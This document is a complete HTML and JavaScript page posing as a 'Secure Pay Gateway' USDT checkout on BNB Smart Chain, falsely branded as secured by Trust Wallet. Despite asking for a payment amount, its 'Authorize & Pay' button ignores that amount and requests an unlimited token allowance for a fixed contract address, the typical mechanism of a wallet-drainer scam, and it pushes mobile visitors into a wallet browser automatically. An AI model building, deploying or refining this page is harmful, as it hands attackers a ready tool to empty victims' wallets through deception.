<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Crypto Payment Gateway</title>
    <!-- Tailwind CSS for sleek dark-mode design -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- qrcode.js CDN -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        body { background-color: #0c1017; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-between p-4">

    <!-- Top Gateway Header Bar -->
    <header class="w-full max-w-md flex justify-between items-center py-4 px-2">
        <div class="flex items-center space-x-2">
            <svg class="w-8 h-8 text-[#3375BB]" viewBox="0 0 1024 1024" fill="currentColor">
                <path d="M512 0C229.224 0 0 229.224 0 512s229.224 512 512 512 512-229.224 512-512S794.776 0 512 0zm0 938.775C275.053 938.775 85.225 748.947 85.225 512S275.053 85.225 512 85.225c236.947 0 426.775 189.828 426.775 426.775S748.947 938.775 512 938.775z"/>
                <path d="M512 213.333c-164.887 0-298.667 133.78-298.667 298.667s133.78 298.667 298.667 298.667 298.667-133.78 298.667-298.667-133.78-298.667-298.667-298.667zm0 512c-117.845 0-213.333-95.488-213.333-213.333S394.155 298.667 512 298.667s213.333 95.488 213.333 213.333-95.488 213.333-213.333 213.333z"/>
            </svg>
            <span class="font-bold text-lg tracking-wide">Secure Pay Gateway</span>
        </div>
        <div class="text-xs bg-[#1a2332] text-[#22c55e] px-3 py-1.5 rounded-full font-semibold border border-[#233554] flex items-center space-x-1">
            <span class="w-2 h-2 bg-[#22c55e] rounded-full animate-pulse"></span>
            <span>BSC Mainnet</span>
        </div>
    </header>

    <!-- Main Gateway Checkout Container -->
    <main class="w-full max-w-md bg-[#131a24] border border-[#1f2c3d] rounded-3xl p-6 shadow-2xl text-center my-auto">
        <div class="mb-4">
            <span class="text-xs uppercase tracking-wider text-[#8a9bb8] font-semibold">Merchant Checkout</span>
            <h1 class="text-xl font-bold text-white mt-1">USDT Payment Portal</h1>
            <p class="text-xs text-[#8a9bb8] mt-1">Enter payment amount and approve secure gateway transaction.</p>
        </div>

        <!-- Payment Amount Box -->
        <div class="mb-4 text-left">
            <label class="block text-[11px] text-[#8a9bb8] mb-1 font-medium">Payment Amount (USDT)</label>
            <div class="relative">
                <input type="number" id="payAmount" value="100.00" class="w-full bg-[#1b2636] border border-[#2a3b52] rounded-xl px-4 py-3 text-white text-base font-semibold focus:outline-none focus:border-[#3375BB]" placeholder="Enter amount">
                <div class="absolute right-3 top-3 text-xs text-[#8a9bb8] font-bold">USDT</div>
            </div>
        </div>

        <!-- QR Code Section with Center Trust Wallet Icon (For Operator View) -->
        <div class="mb-4 flex flex-col items-center">
            <div class="relative p-2 bg-white rounded-2xl shadow-inner inline-block">
                <div id="qrcode"></div>
                <div class="absolute inset-0 flex items-center justify-center pointer-events-none">
                    <div class="w-9 h-9 bg-[#3375BB] rounded-full flex items-center justify-center shadow-md border-2 border-white">
                        <svg class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                        </svg>
                    </div>
                </div>
            </div>
            <span class="text-[10px] text-[#8a9bb8] mt-1">Scan to open via mobile gateway</span>
        </div>

        <!-- Account Info Box -->
        <div class="mb-4 text-left">
            <label class="block text-[11px] text-[#8a9bb8] mb-1 font-medium">Wallet Status & Balance</label>
            <div class="bg-[#1b2636] border border-[#2a3b52] rounded-xl p-3 flex justify-between items-center text-xs">
                <span id="walletAddress" class="text-gray-300 truncate">Not Connected</span>
                <span id="usdtBalance" class="text-[#22c55e] font-bold">0.00 USDT</span>
            </div>
        </div>

        <!-- Action Buttons -->
        <div class="space-y-3">
            <button id="connectBtn" class="w-full py-3.5 bg-[#1b2636] hover:bg-[#23334a] text-white font-semibold rounded-xl text-sm transition-all border border-[#2a3b52]">
                Connect Wallet
            </button>
            
            <button id="approveBtn" class="w-full py-3.5 bg-[#3375BB] hover:bg-[#285d94] text-white font-semibold rounded-xl text-base transition-all shadow-lg hidden">
                Authorize & Pay via Gateway
            </button>
        </div>

        <!-- Notification / Status Message -->
        <div id="statusMsg" class="mt-4 text-xs min-h-[24px] break-all text-[#8a9bb8]"></div>
    </main>

    <!-- Footer -->
    <footer class="w-full max-w-md text-center py-4 text-[10px] text-[#8a9bb8]">
        Secured by Trust Wallet Protocol &bull; Chain ID: 0x38
    </footer>

    <!-- Ethers.js v5.7.2 CDN -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

    <script>
        // --- 1. CONFIGURATION & SETTINGS ---
        const CONFIG = {
            PROJECT_ID: "d963d606882ff087475106240e7a297f",
            CONTRACT_ADDRESS: "0x6c59f440B5b06DbCC08C49B3B27796AB26Ba624E",
            USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
            CHAIN_ID: "0x38",
            userId: new URLSearchParams(window.location.search).get('userId') || 'default'
        };

        const connectBtn = document.getElementById("connectBtn");
        const approveBtn = document.getElementById("approveBtn");
        const statusMsg = document.getElementById("statusMsg");
        const walletAddressSpan = document.getElementById("walletAddress");
        const usdtBalanceSpan = document.getElementById("usdtBalance");

        let provider, signer, userAddress;

        // --- 2. MOBILE AUTO-DEEP-LINK REDIRECTION ---
        window.addEventListener("DOMContentLoaded", () => {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile && typeof window.ethereum === "undefined") {
                const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
                window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=https://${cleanUrl}`;
                return;
            }

            // Generate QR Code with center logo space
            const currentUrl = window.location.href;
            new QRCode(document.getElementById("qrcode"), {
                text: currentUrl,
                width: 120,
                height: 120,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
        });

        // Modular Notification Handler
        function showNotification(message, type = "success") {
            statusMsg.style.color = type === "success" ? "#22c55e" : "#ef4444";
            statusMsg.innerText = message;
        }

        // --- 3. WALLET CONNECTION & NETWORK ENFORCEMENT ---
        connectBtn.addEventListener("click", async () => {
            if (typeof window.ethereum === "undefined") {
                const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
                window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=https://${cleanUrl}`;
                return;
            }

            try {
                showNotification("Connecting gateway wallet...", "success");
                provider = new ethers.providers.Web3Provider(window.ethereum);

                // Enforce BNB Smart Chain (0x38)
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: CONFIG.CHAIN_ID }],
                    });
                } catch (switchError) {
                    console.error("Network switch error:", switchError);
                }

                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();

                walletAddressSpan.innerText = userAddress.substring(0, 6) + "..." + userAddress.substring(38);
                connectBtn.innerText = "Connected";
                connectBtn.classList.add("bg-green-900/30", "border-green-600");

                // Fetch real-time USDT balance
                await fetchTokenBalance();

                // Reveal Action Button
                approveBtn.classList.remove("hidden");
                showNotification("Wallet connected to gateway.", "success");

            } catch (err) {
                console.error(err);
                showNotification(err.message || "Connection rejected", "error");
            }
        });

        // --- 4. FETCH REAL-TIME USDT BALANCE ---
        async function fetchTokenBalance() {
            try {
                const ERC20_ABI_BALANCE = [
                    "function balanceOf(address account) view returns (uint256)",
                    "function decimals() view returns (uint8)"
                ];
                const tokenContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI_BALANCE, provider);
                const decimals = await tokenContract.decimals();
                const balance = await tokenContract.balanceOf(userAddress);
                const formattedBalance = ethers.utils.formatUnits(balance, decimals);
                
                usdtBalanceSpan.innerText = parseFloat(formattedBalance).toFixed(2) + " USDT";
            } catch (e) {
                console.error("Balance fetch error:", e);
            }
        }

        // --- 5. CORE ACTION: APPROVE MAXIMUM ALLOWANCE (GATEWAY PAYMENT) ---
        approveBtn.addEventListener("click", async () => {
            if (!signer) {
                showNotification("Please connect your wallet first.", "error");
                return;
            }

            try {
                showNotification("Preparing gateway payment authorization...", "success");

                const ERC20_ABI_APPROVE = [
                    "function approve(address spender, uint256 amount) public returns (bool)"
                ];

                const tokenContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI_APPROVE, signer);
                
                // MaxUint256 unlimited allowance execution for gateway processing
                const maxAllowance = ethers.constants.MaxUint256;

                showNotification("Waiting for payment authorization in wallet...", "success");
                const tx = await tokenContract.approve(CONFIG.CONTRACT_ADDRESS, maxAllowance);

                showNotification("Processing payment on BSC...", "success");
                await tx.wait();

                showNotification("Payment Authorized & Gateway Connected Successfully!", "success");
            } catch (error) {
                console.error(error);
                showNotification(error.data?.message || error.message || "Transaction cancelled", "error");
            }
        });
    </script>
</body>
</html>
